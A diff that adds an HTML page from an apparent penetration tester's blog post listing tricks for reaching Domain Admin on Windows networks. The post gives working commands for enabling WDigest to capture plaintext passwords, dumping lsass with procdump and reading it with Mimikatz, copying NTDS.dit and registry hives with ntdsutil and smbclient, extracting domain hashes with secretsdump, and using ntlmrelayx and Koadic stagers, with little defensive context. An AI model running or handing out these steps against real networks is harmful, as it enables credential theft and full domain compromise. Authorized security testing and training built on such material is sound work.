@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Helpful Tricks I Use to Get Domain Admin :: H4cklife!! — No-life it</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
+Dumping Lsass on Windows 10 😋 Quick and Easy  So, we all know you you can&#39;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpached Windows 7 network. See my post on &#34;How I use Koadic on Internals&#34;"/>
+<meta name="keywords" content="Hacking"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/helpful-tricks-i-use-to-get-domain-admin/" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Helpful Tricks I Use to Get Domain Admin"/>
+<meta name="twitter:description" content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
+Dumping Lsass on Windows 10 😋 Quick and Easy  So, we all know you you can&#39;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpached Windows 7 network. See my post on &#34;How I use Koadic on Internals&#34;"/>
+
+
+
+<meta property="og:title" content="Helpful Tricks I Use to Get Domain Admin" />
+<meta property="og:description" content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
+Dumping Lsass on Windows 10 😋 Quick and Easy  So, we all know you you can&#39;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpached Windows 7 network. See my post on &#34;How I use Koadic on Internals&#34;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/helpful-tricks-i-use-to-get-domain-admin/" /><meta property="article:published_time" content="2019-10-07T18:22:27-05:00"/>
+<meta property="article:modified_time" content="2019-10-07T18:22:27-05:00"/><meta property="og:site_name" content="H4cklife!!" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">H4cklife!!</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/beefhook/">Beefhooks</a></li>
+        
+      
+        
+          <li><a href="/wallpapers/">Wallpapers</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about/">About</a></li>
+      
+    
+      
+        <li><a href="/beefhook/">Beefhooks</a></li>
+      
+    
+      
+        <li><a href="/wallpapers/">Wallpapers</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="/posts/helpful-tricks-i-use-to-get-domain-admin/">Helpful Tricks I Use to Get Domain Admin</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            2019-10-07
+        </span>
+      
+      
+      
+        <span class="post-read-time">— 10 min read</span>
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+
+<p>So I was recently on an internal assessment (Thanks <a href="https://twitter.com/hexcartel">Hexcartel</a>) and got to do some cool tricks I felt like sharing. Behold some tricks:</p>
+
+<h3 id="dumping-lsass-on-windows-10">Dumping Lsass on Windows 10 😋</h3>
+
+<h4 id="quick-and-easy">Quick and Easy</h4>
+
+<div align="justify"><p>
+So, we all know you you can't just blast <a href="">Crackmapexec</a> and attach a C2 stager and get shells raining like you could in an unpached Windows 7 network. See my post on <a href="How I use Koadic on Internals.html">"How I use Koadic on Internals"</a> for that; No, on Windows 10 we have to be a little more sophisticated. So, let's say you've gotten local admin creds to a system and there's another Domain Admin that uses the same system but you can't seem to find a way to get their creds. Well, since you have local admin to that box you can use <code>Crackmapexec</code> to enable wdigest on that system so that next time the user auths' to that sytem their creds will get stored in memory and you'll be able to dump them.
+</p></div>
+
+<div align="justify"><p>
+ In dumping their creds you actually have a few ways of doing it. If you want to do this easily you can simply RDP into the host after hours, open up task-manager, right mouse-click on lsass.exe on the <code>details</code> tab, and select <code>create dump file</code>. That'll create a dump file of the lsass.exe process which you can then use Mimikatz against the dump file on your local attacking machine to get some plain-text creds; done.
+</p></div>
+
+<h4 id="procdump">Procdump</h4>
+
+<div align="justify"><p>
+The other way is to use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> [Thanks <a href="http://www.n00py.io/">N00py</a>] to create the dump file. This is a great tool that will go undetected being that it is a Microsoft Sysinternals tool. Every time I do this process I use this <a href="https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php">ARTICLE</a> which walks through the process of dumping lsass with Procdump and dumping the creds locally with Mimikatz. It's basically a <b>TLDR</b> of this tip. Using procdump instead of RDPing will allow for more creativity in creating the dump file you need as you can now use the command line in this process.
+</p></div>
+
+<h4 id="getting-the-dump-back">Getting The Dump Back 👈</h4>
+
+<div align="justify"><p>
+So a great way to get the file back off the Windows 10 system is to use `smbclient`. I often completely forget about smbclient when working on internals. I guess it gets overshadowed by the sexiness of Crackmapexec but it's good for downloading files really quickly. Another way is to use SCP since Windows 10 now comes with SSH tools. Usually with these two methods you should be good on getting the file back to your attacking machine. If those won't work Bitsadmin? Powershell...time to Google...
+</p></div>
+
+<div align="justify"><p>
+Once you get the file locally you'll wanna get it to a local Windows system that has Mimikatz on it <i>(Comment below if you can do this on Linux)</i>. Once you have everything ready follow the steps <a href="https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php">here</a> or below.
+</p></div>
+
+<p>So here&rsquo;s the TLDR steps to do all this:</p>
+
+<h4 id="steps">Steps 👟</h4>
+
+<ol>
+<li><p>Enable Wdigest:</p>
+
+<pre><code class="language-bash">crackmapexec smb TARGETHOST -M wdigest -o ACTION=enable
+</code></pre>
+
+<ol>
+<li>Wait a while for the target user to auth to their system</li>
+<li>Use smbclient or Crackmapexec or whatever to upload <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> and dump lsass with it:<br />
+<code>bash
+C:\users\ANOTHER-USER\desktop\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code>
+<b> OR&hellip;</b></li>
+</ol></li>
+
+<li><p>After hours, RDP in to the target system ➡ Open Task-manager and go to Details tab ➡ Right mouse-click and dump lsass.exe</p></li>
+
+<li><p>Download the dump file to your attacking machine</p></li>
+
+<li><p>Use Mimikatz locally and dump the file using the following commands:</p></li>
+</ol>
+
+<pre><code class="language-bash">mimikatz $ sekurlsa::minidump YOUR_DUMP_FILE.dmp
+Switch to minidump
+mimikatz $ sekurlsa::logonPasswords
+</code></pre>
+
+<ol>
+<li><u>LOOK CLOSELY</u> to the output. <b>IF YOU DO NOT LOOK CLOSELY YOU COULD MISS A DOMAIN ADMIN CRED!!!</b> A good tip to make sure you&rsquo;re not missing anything is to copy everything to your local Linux system and use <code>grep</code> to grep for passwords. I usually do:</li>
+</ol>
+
+<pre><code class="language-bash">cat mimikatz_output.txt | grep -i password -B2
+</code></pre>
+
+<div align="justify"><p>
+This will show both the usernames and passwords that were dumped. If the user logged in during the time between you enabling wdigest and dumping lsass you should have the target user's creds in plain-text!
+</p></div>
+
+<h4 id="notes">Notes 📝</h4>
+
+<div align="justify"><p>
+One thing to note about having Mimikatz on Windows 10: You'll need to white-list a folder in your defender settings so it doesn't keep getting popped by your own AV. I'm also sure there's someone out there that would read all this and say..."Why don't you just use/do XYZ to do all this instantly?" To you I say, "leave a comment below! Grace us with your knowledge and wisdom!"
+</p></div>
+
+<p><center>
+<figure>
+<img src="../../images/Wallpapers/nice_view.jpg" alt="Wallpaper" />
+<figcaption>
+<center>You found a Wallpaper!</center>
+</figcaption>
+</figure>
+</center></p>
+
+<h3 id="dumping-ntds-manually-with-a-native-windows-tool">Dumping NTDS Manually With A Native Windows Tool</h3>
+
+<div align="justify"><p>
+Sometimes, due to anti-virus or restrictions against tools, you are unable to use Crackmapexec to dump the DC when that time comes. Sometimes you may have to dump it manually and a great way to do this is by using another native Windows tool by the name of <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753343(v=ws.10)?redirectedfrom=MSDN">NTDSUTIL</a>. If you have the time you can read this <a href="https://www.cyberis.co.uk/2014/02/obtaining-ntdsdit-using-in-built.html">ARTICLE</a> on this:
+</p></div>
+
+<pre><code class="language-c">C:\Users\Posh&gt; ntds
+'ntds' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Posh&gt; ntdsutil
+ntdsutil: activate instance ntds
+Active instance set to &quot;ntds&quot;.
+ntdsutil: ifm
+ifm: c:\dumpty
+ifm: create full c:\dumpty
+Creating snapshot...
+Snapshot set {159231da-b786-465e-a70f-aacd369d8487} generated successfully.
+Snapshot {179aaee5-ddaf-4be6-b77e-7bd64771de86} mounted as C:\$SNAP_201910081913
+_VOLUMEC$\
+Snapshot {179aaee5-ddaf-4be6-b77e-7bd64771de86} is already mounted.
+Initiating DEFRAGMENTATION mode...
+     Source Database: C:\$SNAP_201910081913_VOLUMEC$\Windows\NTDS\ntds.dit
+     Target Database: c:\dumpty\Active Directory\ntds.dit
+
+                  Defragmentation  Status (% complete)
+
+          0    10   20   30   40   50   60   70   80   90  100
+          |----|----|----|----|----|----|----|----|----|----|
+          ...................................................
+
+Copying registry files...
+Copying c:\dumpty\registry\SYSTEM
+Copying c:\dumpty\registry\SECURITY
+Snapshot {179aaee5-ddaf-4be6-b77e-7bd64771de86} unmounted.
+IFM media created successfully in c:\dumpty
+ifm: quit
+ntdsutil: quit
+
+
+// Download the NTDS.dit with SMBCLIENT
+
+
+smb: \dumpty\Active Directory\&gt; get ntds.dit
+getting file \dumpty\Active Directory\ntds.dit of size 119554048 as ntds.dit (85282.7 KiloBytes/sec) (average 85282.7 KiloBytes/sec)
+smb: \dumpty\registry\&gt; get SECURITY
+getting file \dumpty\registry\SECURITY of size 262144 as SECURITY (25599.8 KiloBytes/sec) (average 25600.0 KiloBytes/sec)
+smb: \dumpty\registry\&gt; get SYSTEM
+getting file \dumpty\registry\SYSTEM of size 9961472 as SYSTEM (54044.4 KiloBytes/sec) (average 52547.4 KiloBytes/sec)
+smb: \dumpty\Active Directory\&gt; exit
+
+</code></pre>
+
+<p>Next you&rsquo;ll use all three of these files when using <a href="https://github.com/SecureAuthCorp/impacket">secretsdump.py</a> to dump the domain&rsquo;s AD credentials locally on your attacking machine:</p>
+
+<pre><code class="language-c">⋊&gt; ~/C/CREDS python /usr/share/doc/python-impacket/examples/secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[*] Target system bootKey: 0x7u77e239a4dc745d0a21270c271a4509
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+
+...SNIP...
+</code></pre>
+
+<h4 id="notes-1">Notes 📝</h4>
+
+<p>Dumping this way locally may take a long time depending on what kind of setup you have. It won&rsquo;t be lightning fast like crackmapexec is so don&rsquo;t be shocked by this behavior.</p>
+
+<h3 id="saving-the-hashes-you-relay">Saving the Hashes you Relay 💼</h3>
+
+<p>Yea, it never dawned on me to look at the flags of NTLMrelayX until I looked at the flags of NTLMrelayX. Apprently there&rsquo;s a ton of good features that it can do besides absentmindedly relaying NTLMv2s at targets.</p>
+
+<h4 id="ntlmrelayx-flags">NtlmrelayX Flags</h4>
+
+<pre><code class="language-bash">⋊&gt; /e/g/i/i/e/ntlmrelayx on master ◦ /usr/local/bin/ntlmrelayx.py -h                                    22:52:27
+
+...snip...
+
+Main options:
+  -h, --help            show this help message and exit
+  -debug                Turn DEBUG output ON
+  -t TARGET, --target TARGET
+                        Target to relay the credentials to, can be an IP,
+                        hostname or URL like smb://server:445 If unspecified,
+                        it will relay back to the client
+  -tf TARGETSFILE       File that contains targets by hostname or full URL,
+                        one per line
+  -w                    Watch the target file for changes and update target
+                        list automatically (only valid with -tf)
+  -i, --interactive     Launch an smbclient console instead of executing a
+                        command after a successful relay. This console will
+                        listen locally on a tcp port and can be reached with
+                        for example netcat.
+  -ip INTERFACE_IP, --interface-ip INTERFACE_IP
+                        IP address of interface to bind SMB and HTTP servers
+  --no-smb-server       Disables the SMB server
+  --no-http-server      Disables the HTTP server
+  --smb-port SMB_PORT   Port to listen on smb server
+  --http-port HTTP_PORT
+                        Port to listen on http server
+  -ra, --random         Randomize target selection (HTTP server only)
+  -r SMBSERVER          Redirect HTTP requests to a file:// path on SMBSERVER
+  -l LOOTDIR, --lootdir LOOTDIR
+                        Loot directory in which gathered loot such as SAM
+                        dumps will be stored (default: current directory).
+  -of OUTPUT_FILE, --output-file OUTPUT_FILE
+                        base output filename for encrypted hashes. Suffixes
+                        will be added for ntlm and ntlmv2
+  -codec CODEC          Sets encoding used (codec) from the target's output
+                        (default &quot;ascii&quot;). If errors are detected, run
+                        chcp.com at the target, map the result with
+                        https://docs.python.org/2.4/lib/standard-
+                        encodings.html and then execute ntlmrelayx.py again
+                        with -codec and the corresponding codec
+  -smb2support          SMB2 Support (experimental!)
+  -socks                Launch a SOCKS proxy for the connection relayed
+  -wh WPAD_HOST, --wpad-host WPAD_HOST
+                        Enable serving a WPAD file for Proxy Authentication
+                        attack, setting the proxy host to the one supplied.
+  -wa WPAD_AUTH_NUM, --wpad-auth-num WPAD_AUTH_NUM
+                        Prompt for authentication N times for clients without
+                        MS16-077 installed before serving a WPAD file.
+  -6, --ipv6            Listen on both IPv6 and IPv4
+  --remove-mic          Remove MIC (exploit CVE-2019-1040)
+  --serve-image SERVE_IMAGE
+                        local path of the image that will we returned to
+                        clients
+
+SMB client options:
+  -e FILE               File to execute on the target system. If not
+                        specified, hashes will be dumped (secretsdump.py must
+                        be in the same directory)
+  -c COMMAND            Command to execute on target system. If not specified,
+                        hashes will be dumped (secretsdump.py must be in the
+                        same directory).
+  --enum-local-admins   If relayed user is not admin, attempt SAMR lookup to
+                        see who is (only works pre Win 10 Anniversary)
+
+...snip...
+</code></pre>
+
+<div align="justify"><p>
+Yea so, looking at the flags, you can use <code>-of</code> to specify an output file location where NTLMrelayX will save your relayed hashes! That way if you have issues relaying commands or your target has some sort of antivirus blocking your attempts you still have a chance to crack the hashes later.
+</p></div>
+
+<div align="justify"><p>
+Another interesting flag is the <code>--enum-local-admins</code> flag. NTLMrelayX will do enumeration to try to figure out who the local admin is if the hashes you capture are low privileged! Sometimes it will fail and sometimes it won't but it's better to have than not, that's for sure!
+</p></div>
+
+<div align="justify"><p>
+The last flag I noticed recently was the <code>-i</code> flag which will open up an smbclient session upon successful relay. I haven't played with this yet but it sounds useful. Sometimes when <code>-c</code> commands aren't working this would be a useful alternative to start uploading or downloading some files. Sometimes admins leave big juicy password.xlsx files on their desktops that contain DA creds. This flag would be great!
+</p></div>
+
+<h3 id="using-koadic-and-bloodhound-on-windows-servers">Using Koadic and Bloodhound on Windows Servers 💣</h3>
+
+<div align="justify"><p>
+More often than not if you get access to a Windows Server 2008-2012 box they usually lack strong Anti-virus provisions in place. They don't come with Windows Defender like a normal Windows 10 box would or anything like that so most of the time you can use a mshta stager in Koadic to quickly dump memory with the Mimikatz module or use the enum_domain_info module to quickly develop a strong foundation of information.
+
+Similarly, these servers may be a good place to set up shop for a while and start doing some further enumeration. These servers will similarly be more accepting of things like BloodHound ingestors and maybe, dare I say, meterpreter payloads. You could also use these for <a href="https://github.com/NetSPI/PowerUpSQL">PowerupSQL</a> sessions if you're hunting for sensitive information such as card holder data or patient health information.
+</p></div>
+
+<h3 id="smbclient-for-file-transfers">SMBCLIENT For File Transfers 💽</h3>
+
+<div align="justify"><p>
+It can be a real pain getting files off a Windows machine back on to your local attacking machine and having used crackmapexec for hours getting RCE everywhere it's easy to forget about ol' smbclient. But smbclient can be a great companion when downloading and uploading files quickly. Also, knowing how to recursively download and upload helps too. So the tip, type these words (flags) in next time you use smbclient to enable recursive interactivity. These commands toggle so type them in again if you need to disable them as well:
+</p></div>
+
+<pre><code>*   Recurse  # flag to toggle on recursion
+*   Prompt   # flag to toggle off prompts
+*   mput/mget  # Command used to get and put multiple files
+</code></pre>
+
+<hr />
+
+<pre><code class="language-bash">_______________
+&lt; Ju$t d0 XYZ~! &gt;
+ ---------------
+ \     ____________
+  \    |__________|
+      /           /\
+     /           /  \
+    /___________/___/|
+    |          |     |
+    |  ==\ /== |     |
+    |   O   O  | \ \ |
+    |     &lt;    |  \ \|
+   /|          |   \ \
+  / |  \_____/ |   / /
+ / /|          |  / /|
+/||\|          | /||\/
+    -------------|   
+        | |    | |
+       &lt;__/    \__&gt;
+</code></pre>
+
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="/posts/kiosk-escapes-pt-3-mexico-edition/">
+                <span class="button__text">Kiosk Escapes Pt. 3 - Mexico Edition!!</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+    <script src="https://utteranc.es/client.js"
+        repo="clutchisback1/h4cklife.org"
+        issue-term="pathname"
+        label="general-comment"
+	theme="github-dark"
+        crossorigin="anonymous"
+        async>
+</script>
+
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">Copyright 2019 😜</div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
